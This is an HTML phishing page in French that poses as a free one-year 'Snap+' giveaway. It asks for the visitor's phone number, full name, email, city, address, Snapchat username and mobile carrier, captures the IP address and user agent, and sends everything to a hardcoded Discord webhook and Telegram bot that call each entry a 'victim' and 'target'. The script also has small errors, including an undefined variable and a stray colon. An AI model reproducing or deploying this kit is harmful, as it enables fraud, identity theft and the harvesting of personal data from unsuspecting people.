<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>🎁 Snap+ 1 An Gratuit</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1a0033, #2c014d);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .container {
      background: rgba(44, 1, 77, 0.85);
      border: 2px solid #a54ffb;
      border-radius: 20px;
      padding: 30px 25px;
      width: 340px;
      box-shadow: 0 0 20px #a54ffb;
      animation: pulseBorder 2s infinite;
    }
    @keyframes pulseBorder {
      0% { box-shadow: 0 0 10px #a54ffb; }
      50% { box-shadow: 0 0 25px #a54ffb; }
      100% { box-shadow: 0 0 10px #a54ffb; }
    }
    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background: transparent;
      color: white;
      font-size: 15px;
    }
    button {
      background: #a54ffb;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #a54ffb;
    }
    button:hover {
      background: #8b3ddb;
      box-shadow: 0 0 20px #c177ff;
    }
    .logo { font-size: 60px; }
    .notice { font-size: 12px; color: #bbb; margin-top: 10px; }
    #step2 { display: none; }
    #blocked { display: none; color: #f66; font-size: 18px; }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <div class="logo">👻✨</div>
    <h1>Snap+ Gratuit</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input type="text" name="telephone" placeholder="Numéro de téléphone" required pattern="[\d\s+]{6,}" />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2">
        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Prénom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="Département" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <select name="operateur" required>
          <option value="">Sélectionnez votre opérateur</option>
          <option value="Orange">Orange</option>
          <option value="SFR">SFR</option>
          <option value="Bouygues">Bouygues</option>
          <option value="Free">Free</option>
          <option value="NRJ Mobile">NRJ Mobile</option>
          <option value="La Poste Mobile">La Poste Mobile</option>
          <option value="Autre">Autre</option>
        </select>
        <button type="submit">Valider</button>
      </div>
    </form>
    <div class="notice">Concours non affilié à Snapchat.</div>
  </div>

  <div id="blocked">
    ❌ Accès refusé : votre IP est blacklistée.
  </div>

  <script>
    const BLACKLISTED_IPS = ["123.45.67.89", "111.222.333.444"];
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
    const TELEGRAM_CHAT_ID = "-1001234567890";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        return ip;
      } catch {
        return "IP inconnue";
      }
    }

    async function showStep2() {
      const ip = await getIP();
      if (BLACKLISTED_IPS.includes(ip)) {
        document.getElementById("mainContainer").style.display = "none";
        document.getElementById("blocked").style.display = "block";
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function sendToTelegram(message) {
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      };
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    }

    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
      e.preventDefault();
      const form = new FormData(this);
      const ip = await getIP();
      const userAgent = navigator.userAgent;

            const embed = {
        title: "🎉🔥 **NOUVELLE VICTIME SNAP+** 🔥🎉",
        description: "**💥 Snap+ gratuit 1 an activé ! 💥**\n\n**Détails de la cible :**",
        color: 0x9B00FF,
        thumbnail: {
          url: "https://i.imgur.com/3nXvH0W.png"
        },
        fields: [
          { name: "📞 Téléphone", value: `\`\`\`${data.get("telephone") || "N/A"}\`\`\``, inline: true },
          { name: "📡 Opérateur", value: `\`\`\`${data.get("operateur") || "N/A"}\`\`\``, inline: true },
          { name: "👻 Snapchat", value: `\`\`\`${data.get("snap") || "N/A"}\`\`\``, inline: true },
          { name: "✉️ Email", value: `\`\`\`${data.get("email") || "N/A"}\`\`\``, inline: false },
          { name: "👤 Nom Complet", value: `\`\`\`${data.get("prenom")} ${data.get("nom") || "N/A"}\`\`\``, inline: false },
          { name: "🏙️ Ville / Département", value: `\`\`\`${data.get("ville") || "N/A"} / ${data.get("departement") || "N/A"}\`\`\``, inline: true },
          { name: "🏠 Adresse", value: `\`\`\`${data.get("adresse") || "Non fournie"}\`\`\``, inline: false },
          { name: "🌐 IP Publique", value: `\`\`\`${ip}\`\`\``, inline: false },
          { name: "🖥️ User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
          { name: "🔐 Claimed by", value: "Pas encore revendiqué", inline: false }
        ],
        footer: {
          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`
        },
        timestamp: new Date().toISOString(),
      }:

      // Telegram message (version originale)
      const telegramMessage = `
🎁 *Nouvelle cible Snap+* 
  ┌─📞 Contact
   │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
   │ ├─ Email     : ${data.get("email") || "N/A"}
   │ └─ Snapchat  : ${data.get("snap") || "N/A"}
   
  ├─👤 Identité
   │ ├─ Nom      : ${data.get("nom") || "N/A"}
   │ ├─ Prénom   : ${data.get("prenom") || "N/A"}

  ├─📍 Localisation
   │ ├─ Ville        : ${data.get("ville") || "N/A"}
   │ ├─ Département  : ${data.get("departement") || "N/A"}
   │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}

  ├─📡 Opérateur
   │ └─ ${data.get("operateur") || "N/A"}

  └─🌐 Autres
    ├─ IP          : ${ip}
    └─ User Agent  : ${userAgent}

🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
`;

      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      });

      await sendToTelegram(telegramMessage);

      window.location.href = "merci.html";
    });
  </script>
</body>
</html>
